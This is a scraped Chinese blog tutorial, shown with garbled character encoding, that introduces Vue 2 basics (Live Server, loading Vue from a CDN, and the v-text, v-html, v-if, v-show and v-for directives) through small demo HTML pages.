#cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä»¥ä¸‹å†…å®¹å‚è€ƒç¨‹åºå‘˜åä¸‰çš„Vue3+spring Bootå¤§å‹å‰åç«¯åˆ†ç¦»é¡¹ç›®å®æˆ˜</p>
<h2 data-id="heading-0">å‡†å¤‡å·¥ä½œ</h2>
<p>å­¦ä¹ ä¸€é—¨æ–°çš„æ¡†æ¶è¯­è¨€ï¼Œæˆ‘ä¸ªäººè®¤ä¸ºæœ€å¥½çš„æ–¹å¼å°±æ˜¯å»å®ƒçš„å®˜ç½‘æŠŠç›¸åº”çš„ç”Ÿå‘½å‘¨æœŸä»¥åŠ API éƒ½ç”¨ Demo çš„å½¢å¼å®æ“ä¸€éã€‚é‚£ä¹ˆæœ¬è¯¾ç¨‹ä¹Ÿä¸ä¾‹å¤–ï¼Œå¸¦å¤§å®¶ç®€å•äº†è§£ä¸€ä¸‹ Vue çš„æŒ‡ä»¤å’Œç”Ÿå‘½å‘¨æœŸï¼Œç­‰å®æˆ˜ç¯èŠ‚çš„æ—¶å€™ï¼Œä¼šè®²è§£çš„æ›´åŠ ç»†è‡´ä¸€äº›ã€‚</p>
<p>é¦–å…ˆè¿™é‡Œè®²è§£ Vue çš„ä¸¤ç§ä½¿ç”¨å½¢å¼ã€‚ç¬¬ä¸€ç§æ˜¯ç›´æ¥æŠŠ Vue é™æ€æ–‡ä»¶å¼•å…¥ script æ ‡ç­¾ï¼›ç¬¬äºŒç§æ˜¯é€šè¿‡åŒ…å®‰è£…çš„å½¢å¼ï¼Œä¸‹è½½åˆ° package.json é¡¹ç›®ä¸­ã€‚è¿™é‡Œæ–¹ä¾¿èµ·è§ï¼Œæˆ‘ä»¬é‡‡ç”¨ç¬¬ä¸€ç§å½¢å¼ã€‚</p>
<h4 data-id="heading-1">Live Server</h4>
<p>åœ¨ VS Code æ’ä»¶ç¯‡æˆ‘ä»¬æè¿‡Â <code>Live Server</code>æ’ä»¶ï¼Œå®ƒçš„ä½œç”¨æ˜¯åœ¨ä¿å­˜æ–‡ä»¶æ—¶è‡ªåŠ¨åˆ·æ–°é¡µé¢ã€‚æˆ‘ä»¬ä¸å¦¨æ¥å¤ä¹ ä¸€ä¸‹ä½¿ç”¨æ–¹æ³•ã€‚</p>
<p>1ã€å®‰è£… Live Server</p>
<p>2ã€æ‰“å¼€ VS Code ç¼–è¾‘å™¨ï¼Œåˆ›å»º VueDemo æ–‡ä»¶å¤¹ï¼Œæ–°å»ºä¸€ä¸ª index.html æ–‡ä»¶ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  ä½ å¥½ï¼Œæˆ‘æ˜¯åä¸‰
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>3ã€ç‚¹å‡»ç¼–è¾‘å™¨å³ä¸‹è§’ ã€ŒGo Liveã€</p>
<p>4ã€æµè§ˆå™¨è‡ªåŠ¨å”¤èµ·ï¼Œå±•ç¤ºé¡µé¢ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a8a8b7f8d7948b4b67007f95f7110bf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR1VJUkg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444671&amp;x-signature=PFO90s2QsFINIphlykGOWVLiJEc%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-2">BootCDN</h4>
<p>å®‰åˆ©ä¸€ä¸ªé™æ€èµ„æºé›†åˆç½‘ç«™ â€”Â <a href="https://link.juejin.cn/?target=https%3A%2F%2Fwww.bootcdn.cn%2F" title="https://link.juejin.cn/?target=https%3A%2F%2Fwww.bootcdn.cn%2F" target="_blank">BootCDN</a>Â ï¼Œè¿™ä¸ªç½‘ç«™é›†å„å¤§ä¼˜ç§€å¼€æºåº“ä»£ç äºä¸€èº«ï¼Œç‚¹å‡»å¤åˆ¶ Vue çš„é™æ€èµ„æºÂ <a href="https://link.juejin.cn/?target=https%3A%2F%2Fcdn.bootcss.com%2Fvue%2F2.6.10%2Fvue.min.js" title="https://link.juejin.cn/?target=https%3A%2F%2Fcdn.bootcss.com%2Fvue%2F2.6.10%2Fvue.min.js" target="_blank">é“¾æ¥</a>ï¼Œåœ¨ VueDemo æ–‡ä»¶å¤¹ä¸‹æ–°å»ºä¸€ä¸ªæ–‡ä»¶ demo1.htmlã€‚</p>
<p>new ä¸€ä¸ª Vue å®ä¾‹ï¼Œå°† id ä¸º app çš„ div æ ‡ç­¾ç»‘å®šåœ¨ el å±æ€§ä¸Šï¼Œè¿™ä¸ªå®ä¾‹çš„ä½œç”¨åŸŸå°±æ˜¯ id ä¸º app çš„æ ‡ç­¾å†…ï¼Œ data å±æ€§æ”¾ç½®ç›¸åº”çš„å˜é‡å‚æ•°ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¼€å§‹å­¦ä¹  Vue çš„ç”Ÿå‘½å‘¨æœŸåŠå„ä¸ªå±æ€§æŒ‡ä»¤ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'app'</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">v-text</span>=<span class="hljs-string">"text"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.bootcss.com/vue/2.6.10/vue.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({
      <span class="hljs-attr">el</span>: <span class="hljs-string">'#app'</span>,
      <span class="hljs-attr">data</span>:{
        <span class="hljs-attr">text</span>: <span class="hljs-string">'å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯åä¸‰'</span>
      },
    })
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>æ‰“å¼€ 127.0.0.1:5500/VueDemo/demo1.html å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè¯´æ˜ Vue å¼•å…¥æˆåŠŸã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3df13b979a974861aaeb9b4ede940094~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR1VJUkg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444671&amp;x-signature=q2GgfM1CjXF%2FkaY6gr8LmE1ggx8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">å¼€å¯ Vue ä¹‹æ—…</h2>
<h4 data-id="heading-4">v-text &amp;&amp; v-html</h4>
<ul>
<li><strong>ç›¸åŒç‚¹</strong></li>
</ul>
<p>éƒ½èƒ½å±•ç¤ºæ•°æ®ï¼Œä¸”å±äºå•å‘ç»‘å®šã€‚å³æ•°æ®çš„å˜åŒ–ä¼šå½±å“æ’å€¼çš„å˜åŒ–ï¼Œè€Œæ’å€¼çš„å˜åŒ–ï¼Œä¸ä¼šå½±å“æ•°æ®çš„å˜åŒ–ã€‚å…¶å®Â <code>v-text</code>Â ä¹Ÿå¯ä»¥ç®€å†™ä¸ºÂ <code>{{ }}</code>Â ã€‚</p>
<ul>
<li><strong>ä¸åŒç‚¹</strong></li>
</ul>
<p>v-textï¼šåªèƒ½æ¸²æŸ“çº¯æ–‡æœ¬ï¼Œæµè§ˆå™¨ä¸ä¼šå¯¹å…¶è¿›è¡Œ html è§£æ</p>
<p>v-htmlï¼šç”¨äºè¾“å‡º htmlï¼Œæµè§ˆå™¨ä¼šè§£æ html</p>
<p>ä¸‹é¢é€šè¿‡ä»£ç å®ä¾‹æ¥éªŒè¯ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-xml" lang="xml">// demo1.htmnl
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Vue Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'app'</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{{ text }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{{ html }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">v-text</span>=<span class="hljs-string">"text"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">v-text</span>=<span class="hljs-string">"html"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">v-html</span>=<span class="hljs-string">"html"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.bootcss.com/vue/2.6.10/vue.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({
      <span class="hljs-attr">el</span>: <span class="hljs-string">'#app'</span>,
      <span class="hljs-attr">data</span>:{
        <span class="hljs-attr">text</span>: <span class="hljs-string">'å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯åä¸‰'</span>,
        <span class="hljs-attr">html</span>: <span class="hljs-string">'&lt;strong&gt;å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å£®å£®çš„åä¸‰&lt;/strong&gt;'</span>
      }
    })
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d26e7ef2d2d44ef799ced2043e4d642c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR1VJUkg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444671&amp;x-signature=DRyX%2B57y2WBoJds5ifN6cPkZtLw%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-5">v-ifã€v-else &amp;&amp; v-show</h4>
<ul>
<li><strong>ç›¸åŒç‚¹</strong></li>
</ul>
<p>é€šè¿‡å˜é‡æ§åˆ¶æ ‡ç­¾å†…å®¹çš„æ˜¾ç¤ºæˆ–éšè—ã€‚</p>
<ul>
<li><strong>ä¸åŒç‚¹</strong></li>
</ul>
<p><code>v-if</code>Â åœ¨æµè§ˆå™¨ä¸Šè¡¨ç°ä¸ºæ•´ä¸ª DOM èŠ‚ç‚¹ä¸ä¼šè¢«æ¸²æŸ“ï¼›</p>
<p><code>v-show</code>Â çš„å‘ˆç°å½¢å¼ç›¸å½“äºç»™ DOM èŠ‚ç‚¹æ·»åŠ äº†ä¸€ä¸ª CSS å±æ€§ â€”Â <code>display: none</code>Â ï¼›</p>
<p><code>v-else</code>Â åˆ™ç±»ä¼¼ JS è¯­æ³•çš„Â <code>if else</code>Â åˆ¤æ–­è¯­å¥ï¼Œéœ€è¦ç´§è·Ÿåœ¨Â <code>v-if</code>Â åé¢ã€‚</p>
<p>ä¸‹é¢é€šè¿‡ä»£ç å®ä¾‹æ¥éªŒè¯ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Vue Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'app'</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"isShow"</span>&gt;</span>æˆ‘æ˜¯åä¸‰<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">v-else</span>&gt;</span>æˆ‘æ˜¯åå››<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"!isShow"</span>&gt;</span>æˆ‘æ˜¯åä¸‰<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">v-else</span>&gt;</span>æˆ‘æ˜¯åå››<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">"!isShow"</span>&gt;</span>æˆ‘æ˜¯æ¶ˆå¤±çš„åä¸‰<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.bootcss.com/vue/2.6.10/vue.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({
      <span class="hljs-attr">el</span>: <span class="hljs-string">'#app'</span>,
      <span class="hljs-attr">data</span>:{
        <span class="hljs-attr">isShow</span>: <span class="hljs-literal">true</span>,
      }
    })
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/741eaa072f734c448f0a19f848292f1c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR1VJUkg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444671&amp;x-signature=n9bSeWJAwpIPawalCgJ9v2UEsvc%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>â€œæˆ‘æ˜¯æ¶ˆå¤±çš„åä¸‰â€ ä½¿ç”¨çš„æ˜¯Â <code>v-show</code>Â çš„å½¢å¼éšè—äº† DOM èŠ‚ç‚¹ï¼Œæ­£å¦‚ä¸Šè¿°æ‰€ç¤ºï¼Œp æ ‡ç­¾è¢«æ·»åŠ äº†ä¸€ä¸ªÂ <code>display: none</code>Â CSS å±æ€§ã€‚è€Œä¸Šé¢ä¸¤ä¸ª p æ ‡ç­¾åœ¨æµè§ˆå™¨é‡Œ DOM èŠ‚ç‚¹å¹¶æ²¡æœ‰è¢«æ¸²æŸ“å‡ºæ¥ã€‚</p>
</blockquote>
<h4 data-id="heading-6">v-for</h4>
<p>v-for æŒ‡ä»¤è§£å†³çš„æ˜¯æ¨¡æ¿å¾ªç¯æ¸²æŸ“é—®é¢˜ï¼Œæ²¡æœ‰ Vueã€Reactç­‰æ¡†æ¶ä¹‹å‰éƒ½æ˜¯é€šè¿‡ for å¾ªç¯æ‹¼æ¥å­—ç¬¦ä¸²çš„å½¢å¼ï¼Œé€šè¿‡ append å°†æ‹¼æ¥å¥½çš„èŠ‚ç‚¹å¡å…¥æŒ‡å®šçš„ DOM èŠ‚ç‚¹ã€‚ç°åœ¨æœ‰äº†Â <code>v-for</code>Â æŒ‡ä»¤ï¼Œå°±ä¸ç”¨è¿™ä¹ˆéº»çƒ¦äº†ï¼Œå¾—åˆ°æ•°ç»„ä¹‹åï¼Œåªéœ€ä»¥Â <code>(item, index) in array</code>Â çš„å½¢å¼æ¸²æŸ“æ•°æ®ã€‚</p>
<p>ä¸‹é¢æ˜¯ä»£ç æ¼”ç¤ºï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Vue Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'app'</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(item, index) in list"</span>&gt;</span>{{ index }}{{ item }}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.bootcss.com/vue/2.6.10/vue.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({
      <span class="hljs-attr">el</span>: <span class="hljs-string">'#app'</span>,
      <span class="hljs-attr">data</span>:{
        <span class="hljs-attr">list</span>: [<span class="hljs-string">'å°çº¢'</span>, <span class="hljs-string">'å°æ˜'</span>, <span class="hljs-string">'å°æ™º'</span>, <span class="hljs-string">'å°åˆš'</span>]
      }
    })
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e300871ca1744f3da43052ac37c5a276~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR1VJUkg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444671&amp;x-signature=02q7yjdkmzllGjIZPN6iMvRolKo%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>index æ•°ç»„å¯¹è±¡æ‰€å¯¹åº”çš„ç´¢å¼•å€¼ï¼Œæ¸²æŸ“æ¨¡ç‰ˆçš„æ—¶å€™å¦‚æœéœ€è¦åšä¸€äº›é€»è¾‘è¿ç®—çš„æ—¶å€™ï¼Œä¼šç”¨åˆ°è¿™ä¸ªç´¢å¼•å€¼ï¼Œæ¯”å¦‚åªè®©ç´¢å¼•å€¼ä¸ºå¶æ•°çš„é¡¹è¿›è¡Œæ¸²æŸ“ï¼Œå°±å¯ä»¥ç»“åˆä¹‹å‰çš„Â <code>v-if</code>ã€<code>v-show</code>Â æŒ‡ä»¤å»å®ç°éœ€æ±‚ã€‚</p>
</blockquote>
<p><strong>å°çŸ¥è¯†1</strong>ï¼š<code>v-for</code>Â å’ŒÂ <code>v-if</code>Â ä¸è¦ä¸€èµ·ä½¿ç”¨</p>
<p><code>v-for</code>Â çš„ä¼˜å…ˆçº§é«˜äºÂ <code>v-if</code>Â ï¼Œå½“å®ƒä»¬å¤„äºåŒä¸€èŠ‚ç‚¹ï¼Œ<code>v-for</code>Â çš„ä¼˜å…ˆçº§æ¯”Â <code>v-if</code>Â æ›´é«˜ï¼Œè¿™æ„å‘³ç€Â <code>v-if</code>Â å°†åˆ†åˆ«é‡å¤è¿è¡Œäºæ¯ä¸ªÂ <code>v-for</code>Â å¾ªç¯ã€‚æ¯”è¾ƒå¥½çš„è§£å†³æ–¹å¼æ˜¯ï¼Œå…ˆé€šè¿‡Â <code>computed</code>Â å±æ€§å°†éœ€è¦æ¸²æŸ“çš„åˆ—è¡¨æå‰è¿‡æ»¤ï¼Œå†å°†è¿‡æ»¤åçš„åˆ—è¡¨æ”¾åˆ°æ¨¡æ¿ä¸­æ¸²æŸ“ï¼Œè¿™æ ·åšçš„ç›®çš„æ˜¯è®©é¡µé¢æ¸²æŸ“æ•ˆç‡æ›´é«˜ï¼Œé¿å…ä¸å¿…è¦çš„èµ„æºæµªè´¹ã€‚</p>
<p><strong>å°çŸ¥è¯†2</strong>ï¼š<code>v-for</code>å¯ä»¥æ¸²æŸ“ Object ç±»å‹æ•°æ®</p>
